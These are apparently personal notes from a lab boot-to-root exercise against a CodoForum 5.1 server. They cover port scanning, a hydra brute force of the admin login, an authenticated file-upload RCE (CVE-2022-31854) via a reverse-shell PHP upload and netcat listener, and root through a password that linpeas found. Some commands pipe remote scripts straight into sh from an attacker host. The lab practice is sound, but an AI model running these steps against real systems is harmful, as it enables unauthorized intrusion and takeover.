Given Target: 192.168.186.23

# Recon
nmap --top-ports 4000 -T5 -oN openPorts.txt 192.168.186.23
	Nmap scan report for 192.168.186.23
	Host is up (0.065s latency).
	Not shown: 3998 filtered tcp ports (no-response)
	PORT   STATE SERVICE
	22/tcp open  ssh
	80/tcp open  http

nmap -p22,80 -T4 -sC -sV -oN services.txt 192.168.186.23
	Nmap scan report for 192.168.186.23
	Host is up (0.056s latency).
	Bug in http-generator: no string output.
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
	|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
	|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	|_http-title: All topics | CODOLOGIC
	| http-cookie-flags: 
	|   /: 
	|     PHPSESSID: 
	|_      httponly flag not set
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

dirbuster + dirb

dirb http://192.168.186.23
	---- Scanning URL: http://192.168.184.23/ ----
	==> DIRECTORY: http://192.168.184.23/admin/                                                                                                                
	==> DIRECTORY: http://192.168.184.23/cache/ 

Main site
	The only user available to login in the front-end is admin with the password that you set during the installation.
	Admin page login page found
	![[Pasted image 20231031080932.png]]

so user is admin and password is ???

use burp to find the http request to format the hydra command 

Use xHydra to structure the general command and 

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.184.23 http-post-form "/admin/?page=login:username=^USER^&password=^PASS^:Invalid Username or Password"

xhydra finds it to be admin:admin
![[Pasted image 20231031090736.png]]

# Weaponization

searchsploit codo 5.1 
	 Exploit Title                            |  Path
	------------------------------------------ ---------------------------------
	CodoForum 2.5.1 - Arbitrary File Download | php/webapps/36320.txt
	CodoForum v5.1 - Remote Code Execution (R | php/webapps/50978.py
	------------------------------------------ ---------------------------------
	Shellcodes: No Results
	Papers: No Results

Now look at the RCE and use it
	
	CODOFORUM V5.1 ARBITRARY FILE UPLOAD TO RCE(Authenticated)
	
	CVE 2022-31854
	Exploit found and written by: @vikaran101
	
	[*] Example usage: ./exploit.py -t [target url] -u [username] -p [password] -i [listener ip] -n [listener port]
	[*] Help menu: ./exploit.py -h OR ./exploit.py --help
	 kali  🏡  OSCP  codo                                                                                                                                   
	 python 50978.py -t 192.168.184.23/admin/?page=login -u admin -p admin -i 192.168.45.188 -n 4444


Internet says bad exploit script so do it manually via uploading a revshell.php as the image

hostname -I
	192.168.45.188

nc -nlvp 4444

caught the shell

# Priv Esc

now to upgrade shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

move to tmp
	cd /tmp

Now to get linpeas from web
	curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

From Python on LAN
	sudo python3 -m http.server 80 # Host
	curl 10.10.10.10/linpeas.sh | sh # Victim

Linpeas is running
	╔══════════╣ Searching passwords in config PHP files
	/var/www/html/sites/default/config.php:  'password' => 'FatPanda123', 

www-data@codo:/tmp$ su root
su root
Password: FatPanda123

root@codo:/tmp# whoami
whoami
root
root@codo:/tmp# ls
ls
linpeas.sh  tmux-33
root@codo:/tmp# cd
cd
root@codo:~# ls
ls
email2.txt  proof.txt  snap
root@codo:~# cat proof.txt
cat proof.txt
47e66deafc9df2b49d67474445dcdbae

Boot2Root